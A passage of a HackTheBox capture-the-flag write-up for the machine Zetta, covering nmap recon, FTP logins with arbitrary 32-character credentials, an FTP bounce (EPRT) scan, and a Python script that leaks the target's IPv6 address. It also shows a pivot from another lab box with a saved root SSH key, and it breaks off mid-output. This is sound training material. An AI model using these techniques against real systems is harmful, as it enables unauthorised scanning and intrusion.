@@ -1,0 +1,1227 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Zetta</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-zetta">htb-zetta</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ftp-bounce">ftp-bounce</a> <a class="post-tag" href="/tags#rfc-2428">rfc-2428</a> <a class="post-tag" href="/tags#ipv6">ipv6</a> <a class="post-tag" href="/tags#rsync">rsync</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#tudu">tudu</a> <a class="post-tag" href="/tags#syslog">syslog</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#postgresql">postgresql</a> <a class="post-tag" href="/tags#sqli">sqli</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-02-22T14:45:00+00:00" itemprop="datePublished">Feb 22, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/02/22/htb-zetta.html" style="color: #e6e6e6; text-decoration: none;">HTB: Zetta</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/zetta-cover.webp" type="image/webp"/>
+<img alt="Zetta" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/zetta-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>Zetta starts off different from the start, using FTP Bounce attacks to identify the IPv6 address of the box, and then finding RSync listening on IPv6 only. I’ll use limited RSync access to get the size of a user’s password, and then brute force it to get access to the roy home directory, where I can write my key to the authorized keys file to get SSH access. I’ll escalate to the postgres user with an SQL injection into Syslog, where the box author cleverly uses Git to show the config but not the most recent password. Finally, I’ll recover the password for root using some logic and the postgres user’s password. In Beyond Root, I’ll look at the authentication for the FTP server that allowed any 32 character user with the username as the password, dig into the RSync config, and look at the bits of the Syslog config that were hidden from me.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/204 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/zetta" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Zetta</a> <a href="https://hackthebox.com/machines/zetta" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-zetta.webp" type="image/webp"/> <img alt="Zetta" class="img-av" src="/icons/box-zetta.png"/></picture></a><br/><a href="https://hackthebox.com/machines/zetta" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1167009427402240000">31 Aug 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">22 Feb 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/zetta-diff.webp" type="image/webp"/><img alt="Rated difficulty for Zetta" src="/img/zetta-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/zetta-radar.webp" type="image/webp"/><img alt="Radar chart for Zetta" src="/img/zetta-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:12:38</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">04:50:56</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows three open TCP ports, FTP (21), SSH (22), and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.156
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 14:57 EDT
+Nmap scan report for 10.10.10.156
+Host is up (0.22s latency).
+Not shown: 65532 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-p21</span>,22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.156                                                                                                                  
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 14:57 EDT
+Nmap scan report for 10.10.10.156
+Host is up (0.21s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Pure-FTPd
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+| ssh-hostkey:
+|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
+|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
+|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
+80/tcp open  http    nginx
+|_http-title: Ze::a Share
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.20 seconds
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-sU</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alludp 10.10.10.156                                                                                                                
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-31 15:16 EDT
+Nmap scan report for 10.10.10.156
+Host is up (0.20s latency).
+All 65535 scanned ports on 10.10.10.156 are open|filtered
+
+Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH version</a>, this looks like a Debian 10 buster OS.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<p>The site is for a file sharing site currently centered on FTP:</p>
+<div style="max-height: 800px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/1567321354117.png">
+<img alt="main site" src="https://0xdfimages.gitlab.io/img/1567321354117.png" style="clip-path: polygon(0 0, 100% 0, 100% 760px, 49% 790px, 51% 770px, 0 800px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 760px, 49% 790px, 51% 770px, 0 800px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 775px"><a href="https://0xdfimages.gitlab.io/img/1567321354117.png"><i>Click for full image</i></a></div>
+</div>
+<p>Right in the middle of the page, I find FTP creds:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1567326671440.webp" type="image/webp"/>
+<img alt="1567326671440" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1567326671440.png"/>
+</picture>
+<p>But looking at the source, they are just 32 random characters:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">randomString</span><span class="p">(</span><span class="nx">length</span><span class="p">,</span> <span class="nx">chars</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">length</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nx">i</span><span class="p">)</span> <span class="nx">result</span> <span class="o">+=</span> <span class="nx">chars</span><span class="p">[</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">chars</span><span class="p">.</span><span class="nx">length</span><span class="p">)];</span>
+    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">rString</span> <span class="o">=</span> <span class="nf">randomString</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span class="dl">'</span><span class="p">);</span>
+<span class="nt">&lt;/script&gt;</span>
+...[snip]...
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"media-body fade-up"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"media-heading"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/h3&gt;</span>
+    <span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">rString</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+...[snip]...
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"media-body fade-up"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"media-heading"</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/h3&gt;</span>
+    <span class="nt">&lt;p&gt;&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">rString</span><span class="p">)</span><span class="nt">&lt;/script&gt;&lt;/p&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div></div>
+<p>There are some other good clues on the page too:</p>
+<ul>
+<li>
+<p>The site is called “ZE::A Share”. <code class="language-plaintext highlighter-rouge">::</code> is a nod towards IPv6.</p>
+</li>
+<li>
+<p>In “Stuff We Do”, it mentions FTP with FXP and RFC-2428:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1567356422416.webp" type="image/webp"/>
+<img alt="1567356422416" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1567356422416.png"/>
+</picture>
+</li>
+</ul>
+<p>&lt;/picture&gt;</p>
+<p>I’ll get more about those in the FTP section.</p>
+<ul>
+<li>Looking at the “Our Store” section, they offer FTP and mention “Dual-Stack” is “almost  there”:
+    <picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1567326618170.webp" type="image/webp"/>
+<img alt="1567326618170" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1567326618170.png"/>
+</picture>
+</li>
+</ul>
+<p>&lt;/picture&gt;
+  This is another nod to IPv6.</p>
+<h3 id="ftp---tcp-21">FTP - TCP 21</h3>
+<h4 id="enumeration">Enumeration</h4>
+<p>FTP does not allow anonymous login, but given the information from the webpage, I find I can log in with any 32 character string as both the username and password (they must be the same).</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ftp 10.10.10.156
+<span class="go">Connected to 10.10.10.156.
+220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 1 of 500 allowed.
+220-Local time is now 04:33. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+</span><span class="gp">Name (10.10.10.156:root):</span><span class="w"> </span>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+<span class="go">331 User bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OK. Password required
+</span><span class="gp">Password:</span><span class="w">
+</span><span class="go">230-This server supports FXP transfers
+230-OK. Current restricted directory is /
+230-0 files used (0%) - authorized: 10 files
+230 0 Kbytes used (0%) - authorized: 1024 Kb
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span><span class="gp">ftp&gt;</span><span class="w"> 
+</span></code></pre></div></div>
+<p>There’s nothing there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">200 PORT command successful
+150 Connecting to port 44053
+drwxr-xr-x    2 65534      nogroup          4096 Sep  1 03:36 .
+drwxr-xr-x    2 65534      nogroup          4096 Sep  1 03:36 ..
+-rw-------    1 65534      nogroup             0 Sep  1 03:36 .ftpquota
+226-Options: -a -l 
+226 3 matches total
+</span></code></pre></div></div>
+<h4 id="ftp-bounce">FTP Bounce</h4>
+<p>There is an interesting note that was easy to miss in the connection message:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">230-This server supports FXP transfers
+</span></code></pre></div></div>
+<p>This confirms the message about FPX from the webpage. FXP transfers allow a user to transfer data through one FTP server onto another. This allows me to use a <a href="https://www.linux.org/threads/nmap-ftp-bounce-attack.4493/">Bounce Attack</a>. If I can instruct this FTP server to connect to other servers and other ports, I can use it as a proxy to scan from the position of Zetta.</p>
+<p>There’s two ways to employ this for Zetta, one of them effective.</p>
+<h4 id="port-scanning">Port Scanning</h4>
+<p>In theory I can also port scan through the bounce attack. <code class="language-plaintext highlighter-rouge">nmap</code> has bounce built in, using <code class="language-plaintext highlighter-rouge">-b</code> to pass the credentials and server to bounce through.</p>
+<p>Unfortunately, the ftp connection is very slow to initiate (presumably intentionally on the part of the author), which makes scanning really slow and unreliable. For example, I will learn in a minute that port 8730 is open to IPv6 and on IPv4 to localhost. Here’s a scan of a range that includes that port:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-Pn</span> <span class="nt">-p8725-8735</span> <span class="nt">-b</span> dddddddddddddddddddddddddddddddd:dddddddddddddddddddddddddddddddd@10.10.10.156 127.0.0.1
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-01 04:51 EDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up.
+
+PORT     STATE    SERVICE
+8725/tcp closed   unknown
+8726/tcp closed   unknown
+8727/tcp closed   unknown
+8728/tcp closed   unknown
+8729/tcp closed   unknown
+8730/tcp filtered unknown
+8731/tcp closed   unknown
+8732/tcp closed   dtp-net
+8733/tcp closed   ibus
+8734/tcp closed   unknown
+8735/tcp closed   unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 22.78 seconds
+</span></code></pre></div></div>
+<p>The port does show filtered, which is interesting. But it also took 22 seconds to do 11 ports. The slowness makes this somewhat unpractical, especially when there’s another direction to go.</p>
+<h4 id="learn-zetta-ipv6">Learn Zetta IPv6</h4>
+<p>First, I noticed all the hints towards IPv6 earlier, but I don’t have a way to scan Zetta on IPv6 without knowing it’s IPv6 address. I can bounce back to myself on IPv6 and see the address that connects.</p>
+<p>I’ll need to know my IPv6 address:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>ip addr show dev tun0
+<span class="go">3: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
+    link/none 
+    inet 10.10.14.5/23 brd 10.10.15.255 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef:2::1003/64 scope global 
+       valid_lft forever preferred_lft forever
+    inet6 fe80::fb67:c55a:83d8:dcc1/64 scope link stable-privacy 
+       valid_lft forever preferred_lft forever
+</span></code></pre></div></div>
+<p>I’ll connect to Zetta on FTP using <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc 10.10.10.156 21
+<span class="go">220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
+220-You are user number 2 of 500 allowed.
+220-Local time is now 03:36. Server port: 21.
+220-This is a private system - No anonymous login
+220-IPv6 connections are also welcome on this server.
+220 You will be disconnected after 15 minutes of inactivity.
+USER bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+331 User bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OK. Password required
+PASS bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+230-This server supports FXP transfers
+230-OK. Current restricted directory is /
+230-0 files used (0%) - authorized: 10 files
+230 0 Kbytes used (0%) - authorized: 1024 Kb
+</span></code></pre></div></div>
+<p>Now I’ll enter a <code class="language-plaintext highlighter-rouge">EPRT</code> command to tell the server where to connect using the <a href="https://tools.ietf.org/html/rfc2428">RFC-2428 syntax</a> and my global IPv6:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">EPRT |2|dead:beef:2::1003|443
+501 Sorry, but I won't connect to ports &lt; 1024
+EPRT |2|dead:beef:2::1003|2222
+200-FXP transfer: from 10.10.14.5 to dead:beef:2::1003%144
+200 PORT command successful
+</span></code></pre></div></div>
+<p>It’s worth noting that this server won’t connect to ports under 1024. So I pick a high one. Now I’ll start a <code class="language-plaintext highlighter-rouge">nc</code> listener on 4433 and run <code class="language-plaintext highlighter-rouge">LIST</code>. It fails on the FTP server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">LIST
+150 Connecting to port 4433
+226-Options: -l 
+226 0 matches total
+</span></code></pre></div></div>
+<p>But I get a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 4433
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::4433
+Ncat: Listening on 0.0.0.0:4433
+Ncat: Connection from dead:beef::250:56ff:fe88:e5fa.
+Ncat: Connection from dead:beef::250:56ff:fe88:e5fa:54680.
+</span></code></pre></div></div>
+<p>Now I have the IPv6 of Zetta. Each time the box boots, that IP will change, so I wrote a quick script to fetch it. The script opens a socket on a random port to listen, then logs into FTP, authenticates, and sets the transfer to my IPv6 with the same random port. Then it accepts the connection on the listener, and prints the IPv6:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">random</span>
+<span class="kn">import</span> <span class="n">netifaces</span>
+<span class="kn">import</span> <span class="n">socket</span>
+
+
+<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randint</span><span class="p">(</span><span class="mi">2000</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Generated random listen port: </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Starting listener on ::</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">v6listener</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET6</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">v6listener</span><span class="p">.</span><span class="nf">bind</span><span class="p">((</span><span class="sh">'</span><span class="s">::</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+<span class="n">v6listener</span><span class="p">.</span><span class="nf">listen</span><span class="p">()</span>
+
+<span class="n">myv6</span> <span class="o">=</span> <span class="n">netifaces</span><span class="p">.</span><span class="nf">ifaddresses</span><span class="p">(</span><span class="sh">'</span><span class="s">tun0</span><span class="sh">'</span><span class="p">)[</span><span class="mi">10</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">'</span><span class="s">addr</span><span class="sh">'</span><span class="p">]</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Local IPv6 address: </span><span class="si">{</span><span class="n">myv6</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Connecting to Zetta 10.10.10.156:21</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">'</span><span class="s">10.10.10.156</span><span class="sh">'</span><span class="p">,</span> <span class="mi">21</span><span class="p">))</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] Connected</span><span class="se">\n</span><span class="s">[*] Waiting 10 seconds for FTP MOTD</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Logging in</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">USER </span><span class="si">{</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span><span class="si">}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">PASS </span><span class="si">{</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span><span class="si">}</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+    <span class="n">eprt_str</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">'</span><span class="s">EPRT |2|</span><span class="si">{</span><span class="n">myv6</span><span class="si">}</span><span class="s">|</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="sh">'</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Authenticated</span><span class="se">\n</span><span class="s">[*] Sending </span><span class="si">{</span><span class="n">eprt_str</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">eprt_str</span><span class="si">}</span><span class="se">\n</span><span class="s">LIST</span><span class="se">\n</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">())</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">v6listener</span><span class="p">.</span><span class="nf">accept</span><span class="p">()</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+<span class="n">v6listener</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+<span class="n">conn</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[+] Got IPv6 for Zetta:</span><span class="se">\n</span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Script will return the IPv6:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./get_ipv6.py 
+<span class="go">[*] Generated random listen port: 4686
+[*] Starting listener on ::4686
+[*] Local IPv6 address: dead:beef:2::1009
+[*] Connecting to Zetta 10.10.10.156:21
+[+] Connected
+[*] Waiting 10 seconds for FTP MOTD
+[*] Logging in
+[+] Authenticated
+[*] Sending EPRT |2|dead:beef:2::1009|4686
+[+] Got IPv6 for Zetta:
+dead:beef::250:56ff:feb9:7e7c
+</span></code></pre></div></div>
+<h3 id="alternative-path-to-ipv6">Alternative Path to IPv6</h3>
+<p>An alternative path to finding Zetta’s IPv6 address is to jump over to another box in the same network (any HTB target). I happen to have a SSH key for root on DevOops handy, so I’ll jump on there. This only works if someone else in the same lab has one of these two boxes up, since in the latest HTB, all the boxes are powered down unless someone turns them on.</p>
+<p>On this freshly spun up box there’s only the gateway router in it’s arp table:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@gitter:~# </span>ip neigh
+<span class="go">10.10.10.2 dev ens33 lladdr 00:50:56:b0:58:fc REACHABLE
+fe80::250:56ff:feb0:58fc dev ens33 lladdr 00:50:56:b0:58:fc router STALE
+</span></code></pre></div></div>
+<p>If I ping Zetta, then it’s IPv4 will show up, along with it’s MAC address:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@gitter:~# </span>ping <span class="nt">-c</span> 1 10.10.10.156
+<span class="go">PING 10.10.10.156 (10.10.10.156) 56(84) bytes of data.
+64 bytes from 10.10.10.156: icmp_seq=1 ttl=64 time=0.635 ms
+
+--- 10.10.10.156 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms
+</span><span class="gp">root@gitter:~# </span>ip neigh
+<span class="go">10.10.10.156 dev ens33 lladdr 00:50:56:88:e5:fa REACHABLE
+10.10.10.2 dev ens33 lladdr 00:50:56:b0:58:fc REACHABLE
+fe80::250:56ff:feb0:58fc dev ens33 lladdr 00:50:56:b0:58:fc router STALE
+</span></code></pre></div></div>
+<p>I can <a href="https://ben.akrin.com/?p=1347">calculate the IPv6 from this MAC</a>.</p>
+<ol>
+<li>Put <code class="language-plaintext highlighter-rouge">ff:fe</code> into the middle: <code class="language-plaintext highlighter-rouge">00:50:56:ff:fe:88:e5:fa</code></li>
+<li>Reformat to IPv6: <code class="language-plaintext highlighter-rouge">0050:56ff:fe88:e5fa</code></li>
+<li>Flip the second lowest bit in the first octet: <code class="language-plaintext highlighter-rouge">0250:56ff:fe88:e5fa</code></li>
+<li>I can add the link-local prefix to talk from DevOops: <code class="language-plaintext highlighter-rouge">fe80::0250:56ff:fe88:e5fa</code>
+I can also add the HTB global prefix to communicate from my host: <code class="language-plaintext highlighter-rouge">dead:beef::0250:56ff:fe88:e5fa</code></li>
+</ol>
+<p>I can ping using the link local from DevOops:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@gitter:~# </span>ping6 <span class="nt">-c</span> 3 <span class="nt">-I</span> ens33 fe80::0250:56ff:fe88:e5fa
+<span class="go">PING fe80::0250:56ff:fe88:e5fa(fe80::250:56ff:fe88:e5fa) from fe80::250:56ff:fe88:2554 ens33: 56 data bytes
